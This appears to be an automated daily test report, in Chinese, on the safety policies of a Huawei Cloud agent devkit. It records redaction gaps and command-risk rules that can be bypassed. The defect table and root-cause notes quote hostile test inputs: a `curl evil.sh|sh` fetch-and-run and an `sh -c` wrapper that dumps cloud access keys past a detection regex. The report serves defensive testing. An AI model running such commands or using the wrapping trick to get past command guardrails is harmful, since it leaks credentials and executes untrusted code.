# OpenCode-deepseek-v4-pro-0813 每日测试报告

> **报告名**：`OpenCode-deepseek-v4-pro-0813-测试报告.md`
> **生成时间**：`2026-11-17 05:15:00`（北京时间）
> **执行归档**：`results/OpenCode/2026-11-17-1.92.93.23/Linux/`
> **被测对象**：huaweicloud-devkit（GitHub `huaweicloud/huaweicloud-devkit`）
> **结论**：`PARTIAL`（有 FAIL/SPEC 缺陷 10+1 项，P0 5 项；全部命中历史缺陷单，本次不重复开单）

---

## 一、测试概述

| 项 | 值 |
|---|---|
| 客户端 / Agent | `OpenCode` + `deepseek-v4-pro-0813` |
| OS / 架构 | `Linux`（aarch64） |
| Node / npm / Python | `Node v22.13.0 / npm 10.9.2 / Python 3.12.3` |
| 被测版本（SUT） | `v1.1.14`（npm latest，gitHead `bd985051`） |
| 工具全集 | `47`（`tools.mjs` TOOL_DEFINITIONS） |
| hcloud / 依赖 | `KooCLI 7.2.12` |
| 真云凭证 | `cn-north-4`（AK/SK 已配置，真机执行） |
| 测试类型 | 源码级探针直调 / CLI 真机 / MCP 协议 / 真云 E2E（建删归零） |
| daily 基础用例 | 设计级 107 / 展开级 39（追踪表 216 行） |

> **执行方法**：探针脚本（`.mjs`）直调 `hdk/plugins/huaweicloud-core/src/*` 导出函数（`redactSecrets`/`evaluateCommandRisk`/`serviceCatalog`/`dispatch` 等），决策与结果写 `stdout.log`；真云用例走 `hcloud` CLI 真机建删并归零验证；沙箱走 `huaweicloud_sandbox_*` MCP 工具真机执行；证据统一落 `evidence/<case-id>/`。

---

## 二、执行摘要

| 项 | 值 |
|---|---|
| 计划用例（daily） | `146`（设计级 107 + 展开级 39） |
| 已执行 | `146` |
| PASS / FAIL / BLOCKED / SPEC-MISMATCH / NOT_RUN | `132 / 10 / 2 / 1 / 1` |
| 通过率（分母 = PASS+FAIL+SPEC-MISMATCH，不含 BLOCKED/NOT_RUN） | `92.3%`（132/143） |
| P0 / P1 / P2 新增缺陷 | `5 / 4 / 1`（另有 SPEC 1 项） |
| 红线（I 类）违规 | `0`（真云建删归零、只读子账号复核、无凭证泄漏） |
| 资源释放 | `本次创建资源全部归零` |

---

## 三、状态汇总

### 3.1 设计级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `94` | 有证据且通过 PASS 门禁 |
| FAIL | `9` | 不符预期，根因见缺陷清单 |
| BLOCKED | `2` | 真云环境阻塞（见 §五） |
| SPEC-MISMATCH | `1` | 契约漂移（D1-68 region 优先级） |
| NOT_RUN | `1` | OS 专属 P0 在非对应 OS（D1-39 Windows 专属） |
| **合计** | **`107`** | |

### 3.2 展开级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `38` | 有证据且通过 PASS 门禁 |
| FAIL | `1` | EXP-E01「云主机」路由 MISS |
| BLOCKED | `0` | — |
| SPEC-MISMATCH | `0` | — |
| NOT_RUN | `0` | — |
| **合计** | **`39`** | |

---

## 四、缺陷清单

> 全部 FAIL/SPEC 均为历史缺陷（上游仓已有 open issue），本次**不重复开单**，仅补复核评论，关联清单见 `HISTORY_LINKS.md`。

| # | 级别 | 用例ID | 缺陷描述 | 期望结果（精确断言） | 实际结果 | 根因（文件:行号） | 状态 |
|---|---|---|---|---|---|---|---|
| 1 | P0 | `D2-4` | 凭证脱敏漏小写 `ak=`/`sk=` | 小写与大写形态均脱敏为 `<redacted>` | `ak=AK123456 sk=SKsecret` 明文残留 | `safety-policy.mjs:45` | 历史缺陷 |
| 2 | P0 | `D4-3` | KMS `DecryptData` 明文 secret API 未拦截 | `DecryptData` 应返回 `deny` | `{"decision":"allow","findings":[]}` | `cloud-risk-rules.json:56` | 历史缺陷 |
| 3 | P0 | `D4-16` | `sh -c` 命令包裹穿透（env 泄露） | 包裹形态应返回 `deny` | `allow, findings=[]` | `cloud-risk-rules.json:35` | 历史缺陷 |
| 4 | P0 | `D4-21` | HCL/Terraform broad IAM 制品未拦截 | JSON/HCL 形态均 `deny` | json=deny / hcl=allow | `cloud-risk-rules.json:209,213` | 历史缺陷 |
| 5 | P0 | `D9-12` | initialize 握手未 enforce 时序 | 未 init 先 tools/list 返回 `-32600` | 仍返回 40 工具 | `mcp-protocol.mjs:70-71` | 历史缺陷 |
| 6 | P1 | `D3-S3` | 沙箱预览 URL 未完成（nginx 403） | `complete=true` + HTTP 200 | `complete=false`（HTTP 403） | `session-manager.mjs:1079-1081,1160-1166,1240` | 历史缺陷 |
| 7 | P1 | `D4-17` | 模糊输入 fail-closed 失效 | 无法识别输入应 `deny`/`warn` | `$(curl evil.sh|sh)` 返回 `allow` | `risk-rule-engine.mjs:106` | 历史缺陷 |
| 8 | P1 | `EXP-E01` | 「云主机」意图未路由 ECS | recommendedServices 含 ECS | fallback help（MISS） | `tools.mjs:2363-2371` | 历史缺陷 |
| 9 | P1 | `D3-S7` | 复合意图「部署+RDS」漏路由部署侧 | 同时命中 RDS + 部署目标 | 仅命中 RDS | `tools.mjs:2536,2542` | 历史缺陷 |
| 10 | P2 | `D8-9` | 遥测 sanitizeValue 未脱敏 | 凭证值应脱敏 | 明文残留 | `telemetry.mjs:190-196` | 历史缺陷 |
| 11 | P2 | `D1-68` | region 优先级契约漂移（SPEC） | `HUAWEICLOUD_REGION` 优先 | `HW_REGION` 优先 | `credentials.mjs:225`（另有 173/339） | 历史缺陷 |

### 根因详情（P0 关键项附代码定位）

**#1 [P0] D2-4 凭证脱敏漏小写 ak=/sk=**

- 期望：`redactSecrets('ak=AK123456 sk=SKsecret')` → 脱敏
- 实际：原样返回 `ak=AK123456 sk=SKsecret`，仅大写 `AK=`/`SK=` 被脱敏
- 根因：`safety-policy.mjs:45` 的 `.replace(/(AK|SK)\s*[:=]\s*…/g, …)` 仅带 `g` 不带 `i`，小写 `ak`/`sk` 短名不命中，前段 `access_key|secret_key` 也不含裸 `ak`/`sk`
- 证据：`evidence/D2-4/stdout.log`

**#3 [P0] D4-16 命令包裹穿透**

- 期望：`evaluateCommandRisk('sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"')` → `deny`
- 实际：`allow, findings=[]`
- 根因：`cloud-risk-rules.json:35` env-dump 规则 `(^|\s)(env|printenv|…)` 要求 `env` 前为行首/空白，`sh -c "env` 中前缀为 `"` 非空白
- 证据：`evidence/D4-16/stdout.log`

**#5 [P0] D9-12 initialize 握手时序**

- 期望：未 `initialize` 先 `tools/list` → JSON-RPC `-32600`
- 实际：返回完整 40 工具清单，无拒绝
- 根因：`mcp-protocol.mjs:70-71` 的 `tools/list` 分支无条件 `return { tools: TOOL_DEFINITIONS }`，未维护 initialize 会话状态
- 证据：`evidence/D9-12/stdout.log`

---

## 五、未执行用例与原因（供维护 agent 修改用例）

| 用例ID | 层级 | 优先级 | 状态 | 分类 | 详细原因 | 改用例建议 |
|---|---|---|---|---|---|---|
| `D1-39` | 设计级 | P0 | NOT_RUN | 调归属 | Windows 专属用例（OS 列标注「专属」），本机为 Linux；Linux 侧由展开级 `EXP-NR3-10` 代表覆盖 | — |
| `D3-C1` | 设计级 | P1 | BLOCKED | 补环境 | 真云 ECS 生命周期 E2E：VPC/子网/安全组创建→删除→归零全部成功，但 `CreateServers` 订单提交被 billing 拒绝 `Ecs.0707 "Can not find product"`（账号 BSS 产品目录无该镜像产品映射）。已实测到订单提交层，非用例设计问题 | — |
| `D3-C7` | 设计级 | P1 | BLOCKED | 补环境 | 真云跨区域 E2E：`ap-southeast-3` 不在账号项目范围（账号 project 仅 cn-north-4），ECS 只读返回 `Common.0013`、EIP 创建返回 `VPC.0501`。已实测通过 `list_regions` 含该 region、`plan_cli_command` 含 `--cli-region` | — |

> 两个 BLOCKED 均属「补环境」（账号 billing 产品配额 / 多 region 项目权限缺失），非「改用例」「调归属」；用例本身前置/步骤/预期均可判定，无需修改母版。

---

## 六、安全与红线合规

- [x] 凭证泄漏事件：`0`（证据目录无明文 AK/SK；脱敏用例 D4-26/D4-27 通过）
- [x] 写操作误判 read-only：`0`（D4-18/D4-19 确认流 + 拒绝零执行通过）
- [x] 红线（I 类）违规：`无`（发现 5 项 P0 安全缺陷均为历史已知，非本次新增泄漏）
- [x] 脱敏复核：证据目录无原始凭证/未脱敏日志

---

## 七、资源释放

| 资源 | 创建 | 销毁 | 归零验证 |
|---|---|---|---|
| VPC（D3-C1） | 是（`testbot2-opencode-vpc-*`） | 已删 | `ListVpcs` 不含本次 name |
| 子网（D3-C1） | 是 | 已删 | 随 VPC 删除 |
| 安全组（D3-C1） | 是 | 已删 | 随 VPC 删除 |
| ECS（D3-C1） | 否（订单被 billing 拒绝） | — | 未创建成功 |
| OBS 桶（D3-C2） | 是（`testbot2-opencode-obs-*`） | 已删 | `ls` 不含 bucket |
| 沙箱会话（D3-C6） | 是 | 已 close_session | — |
| 沙箱隧道（D3-C3/D3-S3） | 是（devbridge） | `delete-all` + close | 无 live host |

> 真云只删本次创建的 `testbot2-opencode-*` 资源；删除前按白名单盘点，未误删既有/他人资源。残留 `0` 项。

---

## 八、遗留与建议

- **待裁决 SPEC**：`D1-68` region 优先级契约漂移（实现 `HW_REGION` 优先 vs 契约 `HUAWEICLOUD_REGION` 优先），建议维护 agent 裁决'实现改还是契约改'并回填任一。
- **本轮未覆盖（说明范围）**：D1-39 Windows 专属升级链（Linux 无 Windows）、D3-C1 真云 ECS 完整生命周期（billing 产品配额）、D3-C7 跨区域建删（多 region 项目权限）。
- **历史缺陷集中**：11 项 FAIL/SPEC 全部命中既有 open issue（见 `HISTORY_LINKS.md`），关键修复项集中在 `redactString`（大小写/短名）、安全规则库（DecryptData/env-dump 包裹/HCL IAM）、MCP 握手时序、`sanitizeValue` 脱敏、`serviceCatalog` 中文关键词（「云主机」「部署」）六类。
- **建议**：`safety-policy.mjs:45` 的脱敏正则补 `i` 标志 + 增加裸 `ak`/`sk` 键；`cloud-risk-rules.json` 补充 `DecryptData`/`ciphertext` 与命令包裹展开规则；`mcp-protocol.mjs` 维护 initialize 状态做时序校验。